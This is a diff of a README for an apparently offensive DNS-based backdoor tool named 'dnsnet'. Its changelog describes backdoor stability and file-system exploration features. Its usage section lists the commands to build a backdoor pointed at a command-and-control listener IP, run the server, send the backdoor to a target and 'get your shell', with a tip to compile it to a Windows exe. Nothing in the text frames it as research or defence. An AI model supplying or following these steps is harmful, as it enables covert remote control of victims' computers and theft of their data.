@@ -32,24 +32,19 @@ AlphaV2: Automatic reconnect if connection is lost and manual reset added by pre
 
 BetaV1: Backdoor now remembers where you cd'ed to allowing much better file sytem exploring, overall small fixes to make the backdoor more stable and usable
 
-# In dev?: no
+# In development?: no
 
 # How to use (REPLACE "Listener ip" with the c2 ip):
+```
 git clone https://github.com/R00tendo/dnsnet
-
 cd dnsnet
-
 apt install unrar
-
 unrar e cryptography.rar
-
 pip3 install termcolor
-
 python3 key_generator.py 5 > keys
-
-python3 virus_generator.py <Listener ip>
-
+python3 backdoor_generator.py <Listener ip>
 python3 server.py
+```
 
 and send the backdoor directory and get your shell (if on windows i suggest using pyinstaller to compile it to exe first)
  
